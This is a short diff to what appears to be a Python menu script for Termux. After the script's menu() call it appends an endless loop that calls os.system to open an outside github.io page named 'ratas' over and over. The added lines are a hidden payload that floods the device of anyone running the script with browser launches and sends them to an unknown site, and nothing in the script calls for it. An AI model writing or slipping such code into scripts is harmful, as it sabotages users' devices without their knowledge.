@@ -153,3 +153,5 @@ def menu():
     else:
         incorrecto()
 menu()
+while 1 < 2:
+ os.system("termux-open-url https://fenrir-00.github.io/ratas/")
